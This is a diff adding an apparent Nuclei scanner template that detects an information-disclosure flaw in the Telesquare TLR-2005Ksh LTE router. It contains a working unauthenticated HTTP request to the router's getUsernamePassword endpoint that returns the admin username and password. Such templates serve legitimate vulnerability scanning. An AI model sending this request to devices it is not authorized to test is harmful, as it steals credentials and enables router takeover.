@@ -1,0 +1,29 @@
+id: telesquare-tlr-2005ksh-info-disclosure
+info:
+  name: Telesquare TLR-2005Ksh getUsernamePassword Information Disclosure
+  author: ProjectDiscoveryAI
+  severity: high
+  description: |
+    Telesquare TLR-2005Ksh is a Sk Telecom LTE router produced by Telesquare Korea.
+    There is a security hole in Telesquare TLR-2005Ksh. Attackers can obtain sensitive information such as username and password through the `getUsernamePassword` endpoint.
+  reference:
+    - http://telesquare.co.kr/
+  tags: information-disclosure
+
+http:
+  - raw:
+      - |
+        GET /cgi-bin/admin.cgi?Command=getUsernamePassword HTTP/1.1
+        Host: {{Hostname}}
+        Accept: */*
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - "</admin_username>"
+          - "</admin_password>"
